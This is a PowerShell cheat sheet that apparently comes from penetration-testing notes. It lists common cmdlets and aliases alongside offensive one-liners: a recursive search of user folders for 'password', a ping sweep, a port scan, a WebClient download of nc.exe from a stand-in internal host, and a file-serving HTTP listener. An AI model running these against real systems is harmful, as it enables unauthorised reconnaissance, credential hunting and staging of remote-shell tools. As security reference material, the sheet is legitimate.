---
title: Powershell
category: Misc
order: 8
---

>**Help and Finding Commands**

Function | Command
------------- | -------------
help | <code> help [cmdlet] -detailed, -example, -ful </code>
Properties and Methods of object or command | <code> [object/command] | gm </code>

>**Syntax**

Function | Command
------------- | -------------
List Commands | <code>get-command <set*, *process, ...> </code>
ls/dir | <code>Get-ChildItem (ls, dir, gci) </code>
copy/cp | <code>Copy-Item (cp, copy, cpi) </code>
move/mv | <code>Move-Item (mv, move, mi) </code>
find/findstr/grep | <code>Select-String (sls) </code>
help/man | <code>Get-Help (man, help) </code>
type/cat | <code>Get-Content (cat, type, gc) </code>
ps/tasklist | <code>Get-Process (ps, gps) </code>
cd/pwd | <code>Get-Location  (cd, pwd) </code>
History | <code>Get-History (history)  </code>
Check Command Before Execution | <code>-whatif </code>
Create Subset Objects | <code>get-service | select servicename, displayname </code>



>**Inventory, File Search, and Counting**

Function | Command
--------- | -------
Environment Variables | <code>ls env:, ls variable: </code>
Search for Files | <code>ls -r [dir] [string] 2> $null| % {echo $_.fullname} </code>
Search for text in files | <code>ls -r c:\users | % {select-string -path $_ -pattern password} 2>$null </code>

>**Network and Firewall**

Function | Command
--------- | -------
Ping Sweep | <code>1..255 | % {echo "192.168.2.$_"; ping -n 1 -w 100 192.168.2.$_ | select-string ttl} </code>
Port Scan | <code>1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("192.168.1.1", $_)) "Port $_ is open" } 2>$null </code>
Web Client Download | <code>(New-Object System.Net.WebClient).DownloadFIle("http://10.10.10.10/nc.exe", "c:\nc.exe") </code>

SimpleHTTPServer: 
{% highlight powershell %}
$Hso = New-Object Net.HttpListener 
$Hso.Prefixes.Add(""http://+:8000/"")
$Hso.Start()
While ($Hso.IsListening) {
$HC = $Hso.GetContext()
$HRes = $HC.Response
$HRes.Headers.Add(""Content-Type"",""text/plain"")
$Buf = [Text.Encoding]::UTF8.GetBytes((GC (Join-Path $Pwd ($HC.Request).RawUrl)))
$HRes.ContentLength64 = $Buf.Length
$HRes.OutputStream.Write($Buf,0,$Buf.Length)
$HRes.Close()
}
$Hso.Stop()
{% endhighlight %}


>**Piping and Loops**

Function | Command
--------- | -------
Format Output | <code>ps | format-list -property name, id, starttime (or * for all) </code>
Loops | <code>ForEach-Object { $_ }  <br> 1..10 | % {echo $_} </code>

>**Piping and Loops**

Function | Command
--------- | -------
Create a Service | <code>PS C:\>New-Service -Name "TestService" -BinaryPathName "C:\WINDOWS\System32\svchost.exe -k netsvcs" -StartupType manual </code>
Start a Service | <code>Start-Service TestService </code>
